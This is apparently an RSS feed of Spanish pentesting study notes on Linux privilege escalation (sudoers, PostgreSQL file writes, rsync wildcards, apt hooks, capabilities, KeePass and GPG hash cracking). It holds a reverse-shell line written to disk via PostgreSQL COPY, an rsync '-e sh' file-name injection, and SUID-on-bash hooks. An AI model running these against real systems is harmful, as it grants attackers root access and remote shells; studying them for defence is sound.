<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:ataques" class="tag" target="_blank" rel="noopener nofollow">#ataques</a> <a href="https://dobliuw.com?query=tag:escalada" class="tag" target="_blank" rel="noopener nofollow">#escalada</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a>
<br><br><br>El archivo /etc/sudoers es un archivo de configuración en sistemas Linux que se utiliza para controlar el acceso a los usuarios a las diferentes acciones que pueden realizar en el sistema. Este archivo contiene una lista de usuarios y grupos de usuarios que tiene permisos para realizar tareas de administración en el sistema. <br>El comando "sudo" permite a los usuarios ejecutar comandos como superusuarios o como otro usuario con privilegios especiales. El archivo sudoers especifica qué usuarios pueden ejecutar qué comandos con sudo y con qué privilegios.<br>Abusar de los privilegios a nivel de sudoers es una técnica utilizada por los atacantes para elevar su nivel de acceso en el sistema comprometido. Si un atacantes es capaz de obtener acceso a una cuenta con permisos de sudo en el archivo sudoers, puede ejecutar comandos con privilegios especiales y realizar acciones maliciosas en el sistema. <br>El comando "sudo -l" es utilizado para listar los permisos de sudo de un usuario en particular. Al ejecutar este comando, se muestra una lista de los comandos que el usuario tiene permiso para ejecutar y bajo qué condiciones. <br><br>Para prevenir el abuso de privilegios a nivel de sudoers, se recomienda mantener los permisos adecuados en el archivo sudoers y limitar el número de usuarios con permisos de sudo. Además, es importante monitorear regularmente el archivo sudoers y buscar cambios inesperados o sospechosos en su contenido. <br><br>La escalada varía en base a como se abusa del privilegio que se pueda llegar a tener sobre el binario, pero esto lo podemos encontrar en páginas como <a data-tooltip-position="top" aria-label="https://gtfobins.github.io/gtfobins" rel="noopener nofollow" class="external-link" href="https://gtfobins.github.io/gtfobins" target="_blank">gtfobins</a>, donde una vez tengamos identificado el binario sobre el cual tengamos la posibilidad de ejecutarlo como otro usuario, sea root u otro con más privilegios que el que tenemos en ese momento, simplemente nos dirigimos a dicha página y seguimos los pasos de como escalar nuestro privilegio.<br>Los binarios o tareas que puede ejecutar un usuario proporcionando contraseña  o no, se pueden encontrar en el archivo /etc/sudoers donde por ejemplo, si el usuario dobliuw pudiese ejecutar bajo los privilegios de otro usuario (root) un comando en particular, como por ejemplo <a data-href="Nmap" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/nmap.html" class="internal-link" target="_self" rel="noopener nofollow">Nmap</a> podríamos ver en gtfobins si existe riesgos de poder ejecutar dicho comando como root. <br><br><br><br>]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/linux/abuso-de-privilegios-a-nivel-de-sudoers.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Linux/Abuso de privilegios a nivel de Sudoers.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:01 GMT</pubDate></item><item><title><![CDATA[Abuso de privilegios de escritura en DB's]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:escalada" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#escalada</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:escalada" class="tag" target="_blank" rel="noopener nofollow">#escalada</a> 
<br><br><br>El abuso de privilegios de escritura es un tema imporante en la seguridad e baeses de datos, ya que los usuarios malintencionados pueden aprovechar estos privilegios para manipular o dañar datos, insertar información maliciosa o incluso obtener acceso no autorizado al sitema. Aunque los nombres específicos de los permissos pueden variar entre diferentes sistemas de base de datos, el concepto de abuso es relevante en todos ellos.<br><br><br>Por ejemplo, en PostgreSQL existe un privilegio denominado pg_write_server_files el cual como mencionamos permite al usuario que lo posee la manipulación de archivos existentes, lo que podría suponer un riesgo de cara a la seguridad y un punto crucial de interes para el atacante.<br>Esto de podría utilizar para depositar claves ssh en los repositorios ssh del usuario, ingresar código malicioso en archivos que se ejecutan a nivel de sistema o incluso ejecutar comandos a nivel de sistema.<br>-- Insertar líneas de código en un determinado archivo
COPY (SELECT CAST('bash -i &gt;&amp; /dev/tcp/{host}/{port} 0&gt;&amp;1' AS text)) TO '/path/to/executing/code';

-- Insertar líneas de código de manera alterna
copy (SELECT convert_from(decode('&lt;ENCODED_PAYLOAD&gt;','base64'),'utf-8')) TO '/just/a/path.exec';
Copy<br>Más detalles del abuso de estos privilegios pueden ser encontrados en <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql" target="_blank">HackTricks</a>.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/linux/abuso-de-privilegios-de-escritura-en-db&apos;s.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Linux/Abuso de privilegios de escritura en DB&apos;s.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:01 GMT</pubDate></item><item><title><![CDATA[Abuso de rsync]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> 
<br><br><br>Rsync es una utilidad de sincronización y copia de archivos que se utiliza para transferir y sincronizar datos entre directorios, ya sea en la misma máquina o entre máquinas remotas a través de una red. La principal caraterística distintiva de rysnc es su eficiencia en la trasnsferencia de datos, ya que utiliza algoritmos avanzados que minimizan el uso de ancho de banda y reducen el teimpo necesario para sincronizar archivos. <br><br><br>En máquinas donde se use rsync, depende el uso que se le de podría suponer un riesgo, por ejemplo, supongamos que tenemos una tarea cron que es ejecutada por root la cual se encarga de realizar la siguiente operación. <br>rsync -a *.rdb rsync://backup:873/src/rdb
Copy<br>Lo que vemos es que se esta haciendo uso del '*' lo que no es buena idea ya que de alguna manera se confía en el input del usuario (Sobre todo si el directorio de trabajo contiene permisos de escritura). <br>Al utilizar *.rdb se estan englobando a todos los archivos finalizados en .rdb de manera que podríamos abusar de esto de una manera muy sensilla. <br>echo -e "#!/bin/bash\n\nchmod u+s /bin/bash" &gt; pwn.rdb 
touch -- '-e sh pwn.rdb'
Copy<br>De esta manera lo que estamos haciendo es crear un archivo llamada pwn.rdb <br><br>#!/bin/bash

chmod u+s /bin/bash
Copy<br>Y por otro lado crear un archivo llamado -e sh pwn.rdb, lo que ocaciona que al estar haciendo uso del '*' (Wildcards) para englobar todos los archivos que terminen en .rdb, ambos terminana en .rdb pero el primero (pwn.rdb) contiene un script en bash que le otorga un permiso SUID a la bash y el otro (-e sh pwn.rdb) permite inyectar este "archivo" como comando, y dado que rsync cuenta con el parametro -e el cual permite ejecución de comandos. Esto lo podemos encontrar en páginas como <a data-tooltip-position="top" aria-label="https://gtfobins.github.io/gtfobins/rsync/#shell" rel="noopener nofollow" class="external-link" href="https://gtfobins.github.io/gtfobins/rsync/#shell" target="_blank">gtfobins</a>.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/linux/abuso-de-rsync.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Linux/Abuso de rsync.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:01 GMT</pubDate></item><item><title><![CDATA[Abuso de servicios internos del sistema]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:escalada" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#escalada</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:escalada" class="tag" target="_blank" rel="noopener nofollow">#escalada</a> 
<br><br><br>Los servicios internos  son componentes esenciales que operan en segundo plano dentro de un sistema operativo, encargándose de funciones críticas como la gestión de red, impresión, actualización de software y monitoreo del sistema, entre otros. <br>NO obstante, si estos servicios no están configurados adecuadamente y se encuentran activos, pueden representar una brecha de seguridad significativa. Los atacantes podrían explotar estos servicios para obtener acceso no autorizado al sistema y llevar a cabo actividades malintencionadas. <br>Un ejemplo concreto sería un servicio de red mal configurado con permisos elevados. Si un atacante logra identificarlo y hallar una forma de aprovecharlos, podría utilizarlo para escalar privilegios y obtener acceso de administrador. <br><br>Como sabemos cuando comprometemos una máquina puede ser que debido a reglas de firewall o configuraciones no veamos puertos abiertos a la hora de escanear los mismos, pero una vez que estamos dentro puede ser muy interesante revisar los puertos de la máquina ya que tal vez veamos resultados diferentes y podamos dar con servicios que corren que antes no podíamos ver. <br>Ejemplo: <br>Supongamos que en la ruta /etc/systemd/system existen dos archivos, un apt-update.service y un apt-update.timer los cuales llegamos a ver en base a ver los timers de los servios del sistema y buscar por uno el cual nos llama la atención llamado apt-udpate.service <br>systemctl list-timers
# Fri 2023-06-02 11:38:50 EDT 18s left       Fri 2023-06-02 11:38:20 EDT 11s ago      apt-update.timer             apt-update.service

find / -name apt-update.service 2&gt;/dev/null 
# /etc/systemd/system/apt-update.timer
# /etc/systemd/system/timers.target.wants/apt-update.timer
Copy<br>De esta manera nos dirigimos a la ruta /etc/systemd/system para ver el contenido de estos archivos. <br><br> [Unit] 
 Description=Update package list 
 
 [Service]
 Type=oneshot
 ExecStart=/usr/bin/apt update 
Copy<br><br> [Unit]
 Description=Update package list every 30 seconds 
 
 [Timer]
 OnUnitActiveSec=30s 
 Unit=apt-update.service
 
 [Install]
 WantedBy=timers.target 
Copy<br>En donde vemos que es un servicio el cual dispone de un timer para ser ejecutado cada 30s y que se encarga de ejecutar un apt-update del sistema. <br>En este punto podríamos ver si por algún motivo contamos con permisos de escritura en la carpeta /etc/apt/apt.conf.d, en caso de contar con permisos de escrituras podríamos automáticamente buscar como realizar una ejecución de un comando Pre-Invoke al apt, ya que podemos establecer acciones que queremos que se realicen de manera previa y posterior a una actualización del sistema. <br>Por lo que en la ruta /etc/apt/apt.conf.d creamos el archivo con formato como el de los demás, por ejemplo 01privesc:<br><br>APT::Update::Pre-Invoke  {"chmod u+s /bin/bash";};
Copy<br>De esta manera en base al abuso de servicios internos del sistema podríamos lograr escalar privilegios. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/linux/abuso-de-servicios-internos-del-sistema.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Linux/Abuso de servicios internos del sistema.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:02 GMT</pubDate></item><item><title><![CDATA[Abuso de sistema de archivos montados]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> 
<br><br><br>Un sistema de archivos es una estructura que permite organizar y almacenar datos en un dispositivo de almacenamiento ,como un disco duro o una memoria USB. Cada sistema de archivos tiene su propio formato y conjunto de reglas para almacenar y recuperar datos de manera eficiente. <br>Cunado hablamos de sistema de archivos montados en el sistema, nos referimos a los sistema de archivos que están dispoinles y accesibles para el sistema operativoe nu n momento dado. En un sistema informático, es posible tener varios dispositivos de almacenamiento (discos duros, particiones, memorias USB, etc.), y cada uno puede contener uno o más isstemas de archivos. <br><br><br>En determinados escenarios analizar el sistema de archivos montados en el sistema puede ser un buen caso a analizar, ya que podríamos contar con "backups", entre otros los cuales contengan información sensible. <br>Para analizar el estado de los archivos montados podemos hacer uso del comando df -h el cual nos arrojara información acerca de los dispositivos montados, entre ellos una columna llamada "Filename" la cual nos puede servir para a travez de esta montar todo el contenido de uno de estos archivos en una ruta dada. <br>df -h 
# Filesystem        Size      Used    Avail              Use%      Mounted on
# /dev/sda2         7.3G      3.5G    3.8G                49%         /backup

mkdir /mnt/pwn 
mount /dev/sda2 /mnt/pwn 
Copy<br>En este ejemplo, estamos montando todo el contenido de archivo montado en /dev/sda2 en una ruta especifica como lo es /mnt/pwn. <br>La herramienta mount sirve para montar un sistema de archivos en un punto de montaje específico, lo que permite que los datos almacenados en eses sistema de archivos sean accesibles a trevés del directorio especificado. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/linux/abuso-de-sistema-de-archivos-montados.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Linux/Abuso de sistema de archivos montados.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 26 Feb 2024 23:53:42 GMT</pubDate></item><item><title><![CDATA[Análisis de archivos .jar]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> 
<br><br><br>Un archivo JAR es un tipo de archivo que permite ejecutar aplicaciones y herramientas escritas en el lenguaje Java. Tiene un format que combina muchos archivos en un solo.<br><br><br>De cara a una posible escalada de privilegios, puede ser interesante analizar los archivos .jar existentes que puedan tener alguna relación con el escenario al cual nos enfrentamos, pudiendo buscar credenciales de base de datos, credenciales, datos sensibles, posibles explotaciones, etc.<br>
Para llevar a cabo este tipo de análisis podríamos hacer uso de herramientas como <a data-tooltip-position="top" aria-label="https://github.com/deathmarine/Luyten" rel="noopener nofollow" class="external-link" href="https://github.com/deathmarine/Luyten" target="_blank">Luyten</a>, una herramienta con GUI diseñada para analizar el código de todo el archivo JAR.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/linux/análisis-de-archivos-.jar.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Linux/Análisis de archivos .jar.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:02 GMT</pubDate></item><item><title><![CDATA[Base de datos de contraseñas con Keepass]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:escalada" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#escalada</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:windows" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#windows</a> <a class="tag" href="https://dobliuw.com/?query=tag:linux" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#linux</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:escalada" class="tag" target="_blank" rel="noopener nofollow">#escalada</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a>
<br><br><br>Puede darse el caso de que tanto para sistemas <a href="https://dobliuw.com?query=tag:windows" class="tag" target="_blank" rel="noopener nofollow">#windows</a> como sistemas <a href="https://dobliuw.com?query=tag:linux" class="tag" target="_blank" rel="noopener nofollow">#linux</a>, se encuentren archivos con la extención .kdbx extención pertenecientes a base de datos del gestor de contraseñas kepass. <br>De manera que podríamos hacer uso de herramientas como keepass2john para extraer el hash de la contraseña y posteriormente intentar romperlo con ataques de fuerza bruta. <br># Extraer el hash de la base de datos y guardarlo en el archivo hash
keepass2john {file.kdbx} &gt; hash 
# Realizar un ataque de fuerza bruta al hash extraido 
john -w:/usr/share/wordlists/rockyou.txt hash 
# Una vez conseguido el hash podríamos abrirnos la base de datos con keepass
sudo apt install keepassxc
keepassxc {file.kdbx}
Copy<br>De manera que en uno de los mejores casos, esto nos podría servir para escalar privilegios  o pivotear a usuarios con mayores privilegios con contraseñas almacenadas en el interior de la base de datos. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/linux/base-de-datos-de-contraseñas-con-keepass.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Linux/Base de datos de contraseñas con Keepass.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:02 GMT</pubDate></item><item><title><![CDATA[GPG]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:escalada" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#escalada</a> 
 <br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:escalada" class="tag" target="_blank" rel="noopener nofollow">#escalada</a> 
<br><br><br>GPG es una implementación del estándar de cifrado de datos de OpenPGP (pretty Good Privacy). Proporciona una forma de ecnriptar y firma digitalmente datos, lo que garantiza la confidencialidad y auntenticidad de la información. GPG se utiliza ampliamente para protefer la privacidad de los correos electrónicos y otros datos sensibles. <br><br><br> Clave Pública: Es una clave que se comparte abiertamente y se utiliza para cifrar datos y verificar firmas digitales. Cualquiera puede obtener tu clave pública. Su función principal es cifrar los datos que solo tú, con tu clave privada, podrás descifrar.<br>
Clave Privada: Es una clave secreta que posees y utilizas para descifrar los datos cifrados con tu clave pública, y también para firmar digitalmente los datos. La clave privada nunca debe ser compartida n idivulgada, ya que comprmetería la seguridad de tuis comunicaciones. <br><br><br>Las fingerprints (Huellas Dactilares) y las firmas digitales son dos conceptos importantes en el contexto de GPG.<br>
<br>Fingerprints: Es un representación única y compacta de una clave pública. Se genera a partir de los valores de la clave pública y se utiliza para verificar la autenticidad de una clave. La huella digital es un secuencia alfanumérica que generalmente se representa en grupos separados por espacios para facilitar su lecutra y comparación.
<br>Firmas Digitales: Las firmas digitales son una forma de autenticación y verificación en el mundo digtal. En el contexto de GPG, una firma digital se crea utilizzando tu clave privada para cifrar un resumen (hash) del contenido de un archivo o mensjes. LA firma resultate se adjunta al archivo y se comparte jutno con el contenido. 
<br>En resumen las fingerprints son una forma segura de identificar claves públicas y de verificar su autenticidad, mientras que las firmas digitales son utlizadasa para autenticar y verificar la ingregridad de los datos. <br><br><br>Para hacer uso de gpg primeramente necesitamos instalarlo con el comando sudo apt-get install gnupg, una vez realizado esto ya podríamos comenzar a hacer uso de esta herramienta. <br>
<br>


<br>gpg --gen-key
Copy<br>
<br>


<br># Exportar una clave pública
gpg --armor --export {mail@mail} &gt; pub.key
# Importar un calve pública 
gpg --import public_key.asc
Copy<br>
<br>


<br>echo 'text to encrypt' | gpg --encrypt --armor -r 'recipient@gmail.com' &gt; text_encrypted.asc
Copy<br>
<br>


<br>gpg --decrypt {encrypted_file}
Copy<br>
<br>


<br>gpg --sign archivo.txt
Copy<br>
<br>


<br>gpg --verify archivo.txt.sig
Copy<br>
<br>


<br>gpg --list-secret-keys
Copy<br>
<br>


<br>gpg --delete-secret-key {key}
Copy<br>
<br>


<br>gpg --clearsign -o message.signed message.txt
Copy<br><br><br>Cuando nos enfrentemos a mensajes encriptados, en caso de contar con la clave privada podríamos importar esta e intentar encontrar la clave utilizada para la creación de esta clave, ya que habitualmente se suele utilizar constraseñas para la creación de estas claves y así protegerlas.<br>Para extraer el hash de esta contraseña desde una clave privada podemos hacer uso de herramientas como gpg2john. <br>gpg2john private_key.asc &gt; hash_gpg
Copy<br> Una vez dispongamos del hash almacenado en un archivo, podremos intentar realizar ataques de fuerza bruta con herramientas como john. <br>john --wordlist=/usr/share/wordlist/rockyou.txt hash_gpg
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/linux/crack-gpg-messages-(-gnu-privacy-guard-).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Linux/Crack GPG messages - ( GNU Privacy  Guard ).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 22 Dec 2023 23:24:28 GMT</pubDate></item><item><title><![CDATA[Detección y explotación de Capabilities]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:escalada" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#escalada</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:escalada" class="tag" target="_blank" rel="noopener nofollow">#escalada</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a>
<br><br><br>En sistemas Linux, las capabilities son una funcionalidad de seguridad que permite a los usuarios realizar acciones que normalmente requiere privilegios de superusuario (root), sin tener que concederles acceso completo de superusuario. Esto se hace para mejorar la seguridad, ya que solo necesita ciertos privilegios puede obtenerlos sin tener que ejecutarse como root. <br>Las capabilities se dividen en 3 tipos: <br>
<br>


<br>


<br>


<br>Algunas capabilities pueden suponer un riesgo desde el punto de vista de la seguridad si se les asignan a determinado binarios. Por ejemplo, la capability CAP_SETUID permite a un proceso establecer el UID de un proceso a otro valor diferente al suyo, lo que puede permitir que un usuario malintencionado ejecute código malicioso con privilegios elevados.<br>Para listar las capabilities de un archivo binario en Linux, se puede usar el comando getcap. Este comando muestra las capabilities efectivas, heredables y permitidas del archivo. Por ejemplo, para ver las capabilities del binario /usr/bin/ping, podemos ejecutar el comando: <br>getcap /usr/bin/ping<br>La salida del comando mostrará las capabilities asignadas al archivo: <br>/usr/bin/ping = cap_net_admin,cap_net_raw+ep<br>En este ejemplo, el binario ping tiene dos capabilities asignadas. <br>Para asignar una capability a un archivo binario, se puede utilizar el comando setcap. Este comando establece capabilities efectivas, heredables y permitidas para el archivo especificado.  (sudo setcap {capability} {binario})<br>Es importante tener en cuenta que los permisos permitidos pueden ser limitados aún más mediante el uso de un mecanismo de control de acceso obligatorio (MAC, Mandatory Access Control), como SELinux o AppArmor, que restringen las acciones que los procesos puede realizar en función de la política de seguridad del sistema. <br><br>Para ver las capabilitys existentes, podríamos fijarnos algún proceso, por ejemplo, tomar algún PID obtenido al realizar el comando ps -faux y dirigirnos a su ruta, supongamos que tomamos el proceso 480, nos dirigimos a /proc/480/status y veríamos info del proceso, donde, si grepeamos por Cap veríamos 5 resultados:<br>ps -faux 
# 480 ..... 

cat /proc/480/status | grep Cap 
#CapInh:	0000000000000000
#CapPrm:	000001ffffffffff
#CapEff:	000001ffffffffff
#CapBnd:	000001ffffffffff
#CapAmb:	0000000000000000

# Para ver las capabilities disponibles y asignadas podemos usar el sig comando: 
capsh --decode=000001ffffffffff

# Listar capabilities desde la raiz 
getcap -r / 2&gt;/dev/null

# También se podría usar una herramienta 
getpcaps {PID}

# -----------------------

# Setear una capabilitie 
setcap cap_setuid+ep /usr/bin/python3.10 
# Eliminar una capabilitie 
setcap -r /usr/bin/python3.10 
Copy<br>Para escalar los privilegios podríamos ver páginas, una vez más, como <a data-tooltip-position="top" aria-label="https://gtfobins.github.io/gtfobins" rel="noopener nofollow" class="external-link" href="https://gtfobins.github.io/gtfobins" target="_blank">gtfobins</a> para ver que capabilities son peligrosas para determinados usuarios así como poder explotar estas capabilities para dichos binarios. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/linux/detección-y-explotación-de-capabilities.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Linux/Detección y explotación de Capabilities.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 22 Dec 2023 23:26:19 GMT</pubDate></item><item><title><![CDATA[Detección y explotación de tareas Cron]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:escalada" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#escalada</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><br>
